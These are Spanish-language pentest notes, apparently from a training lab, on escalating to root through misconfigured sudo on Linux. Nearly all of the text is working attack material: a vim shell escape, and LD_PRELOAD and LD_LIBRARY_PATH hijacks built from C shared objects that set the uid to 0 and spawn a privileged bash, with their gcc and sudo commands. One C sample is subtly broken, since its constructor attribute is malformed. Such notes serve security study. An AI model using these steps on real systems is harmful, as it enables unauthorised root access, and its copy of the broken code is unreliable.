# Sudo

## Shell escape sequences

Enumere los programas que Sudo permite ejecutar a su usuario:

sudo -l&#x20;

Ejemplo en la maquina :

**`NOPASSWD: /usr/bin/vim (root)`**

Visitar [GTFOBins](https://gtfobins.github.io/)

Como objetivo probare a vim para poder ser root.

Se puede ejecutar

`sudo vim -c ':!/bin/sh'`

O entra en vim y ejecutar `!/bin/sh`&#x20;

Salimos de vim y ya somos root.

## Environment Variables

implica aprovechar la configuración de sudo para heredar ciertas variables de entorno del usuario que ejecuta el comando. Esto puede permitir que un atacante modifique variables de entorno específicas para ejecutar comandos con privilegios elevados que de otro modo no tendría permiso para ejecutar.

Sudo se puede configurar para heredar ciertas variables de entorno del entorno del usuario.

`sudo -l`

`env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH`

`LD_PRELOAD y LD_LIBRARY_PATH` se heredan del entorno del usuario.

`LD_PRELOAD` carga un objeto compartido antes que otros cuando se ejecuta un programa. `LD_LIBRARY_PATH` proporciona una lista de directorios donde se buscan primero las bibliotecas compartidas.

Cree un objeto compartido utilizando el código ubicado en /home/user/tools/sudo/preload.c:

**Código**&#x20;

```
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 
void _init() { 
    unsetenv("LD_PRELOAD"); 
    setresuid(0,0,0); 
    system("/bin/bash -p"); 
} 

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Ejecute uno de los programas que se le permite ejecutar a través de sudo, mientras establece la variable de entorno LD\_PRELOAD en la ruta completa del nuevo objeto compartido:

`sudo LD_PRELOAD=/tmp/preload.so apache2`

Debería aparecer un shell de root. Salga del shell antes de continuar. Dependiendo del programa que elija, es posible que también necesite salir de este.

Ejecute ldd contra el archivo de programa apache2 para ver qué bibliotecas compartidas utiliza el programa:&#x20;

`ldd /usr/sbin/apache2`

Cree un objeto compartido con el mismo nombre que una de las bibliotecas enumeradas (libcrypt.so.1) utilizando el código ubicado en library\_path.c:

```
library_path.c 
#include <stdio.h> 
#include <stdlib.h> 
static void hijack() 
attribute((constructor)); 

void hijack() { 
    unsetenv("LD_LIBRARY_PATH"); 
    setresuid(0,0,0); system("/bin/bash -p"); 
} 
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /library_path.c

sudo LD_LIBRARY_PATH=/tmp apache2

```

<mark style="color:red;">**Recursos**</mark>

[Sudo Part-2 – Linux Privelege Escalation - Juggernaut-Sec](https://juggernaut-sec.com/sudo-part-2-lpe/)

[Sudo Binary Relative Path - RedTeam Nation](https://redteamnation.com/sudo-binary-relative-path/)
